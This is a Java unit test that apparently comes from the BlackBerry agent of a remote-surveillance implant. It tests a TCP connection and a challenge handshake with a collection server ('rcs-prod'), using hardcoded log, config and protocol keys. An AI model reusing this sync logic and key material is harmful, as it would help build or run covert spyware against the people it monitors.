package com.ht.tests.unit;

import java.io.IOException;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.tests.AssertException;
import com.ht.tests.TestUnit;
import com.ht.tests.Tests;
import com.ht.tests.accessor.TransferAccessor;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.transfer.DirectTcpConnection;
import com.ht.rcs.blackberry.transfer.ProtocolException;

public class UT_Sync extends TestUnit {

	static Debug debug = new Debug("UT_Sync", DebugLevel.VERBOSE);

	// RCS 323
	byte[] LogKey = new byte[] { (byte) 0x2b, (byte) 0xb8, (byte) 0x0b,
			(byte) 0xc9, (byte) 0x61, (byte) 0x0a, (byte) 0x0a, (byte) 0x7b,
			(byte) 0x6c, (byte) 0x9c, (byte) 0x10, (byte) 0x06, (byte) 0x85,
			(byte) 0x3d, (byte) 0x80, (byte) 0x72 };
	byte[] ConfKey = new byte[] { (byte) 0xdc, (byte) 0xaa, (byte) 0x14,
			(byte) 0xa8, (byte) 0xdd, (byte) 0xe6, (byte) 0x94, (byte) 0x69,
			(byte) 0x38, (byte) 0x25, (byte) 0x88, (byte) 0x45, (byte) 0x32,
			(byte) 0xb2, (byte) 0x4a, (byte) 0x1a };
	byte[] ProtoKey = new byte[] { (byte) 0xb0, (byte) 0xf4, (byte) 0x45,
			(byte) 0x16, (byte) 0xd1, (byte) 0x30, (byte) 0xd0, (byte) 0xa5,
			(byte) 0x51, (byte) 0x30, (byte) 0xdb, (byte) 0x9b, (byte) 0xac,
			(byte) 0x6f, (byte) 0xd5, (byte) 0xfb };

	String host = "rcs-prod";
	int port = 80;

	TransferAccessor transfer;

	public UT_Sync(String name, Tests tests) {
		super(name, tests);
		transfer = new TransferAccessor();
	}

	public boolean run() throws AssertException {
		ConnectionTest();
		// ConnectionRemoteTest();
		TransferTest();
		return true;
	}

	private void TransferTest() throws AssertException {

		Keys.byteChallengeKey = ProtoKey;
		Keys.BuildID = "RCS_0000000323";
		Keys.InstanceID = "1234567890123456"; // univoco per device e per
		// utente. (imei?)
		// sha1(user_id): 40 char

		transfer.init(host, port, false);
		try {
			transfer.ChallengeTest();
		} catch (ProtocolException e) {
			debug.error("Protocol exception: " + e);
			throw new AssertException();
		}
	}

	private void ConnectionTest() throws AssertException {
		DirectTcpConnection connection = new DirectTcpConnection(host, port);
		boolean connected = connection.connect();
		AssertThat(connected, "not connected");

		connection.disconnect();
	}

	private void ConnectionRemoteTest() throws AssertException {
		String remoteHost = "iperbole.suppose.it";
		int port = 8080;
		DirectTcpConnection connection = new DirectTcpConnection(remoteHost,
				port);
		boolean connected = connection.connect();
		AssertThat(connected, "not connected");

		try {
			debug.trace("send");
			// connection.send("HelloWorld".getBytes());
			boolean ret = connection.send(Keys.getChallengeKey());
			AssertThat(ret, "cannot send");
			debug.trace("receive");
			byte[] rec = connection.receive(5);
			String string = new String(rec);
			debug.trace("Received: " + string);
		} catch (IOException e) {
			debug.error(e.toString());
		}

		connection.disconnect();
	}

}
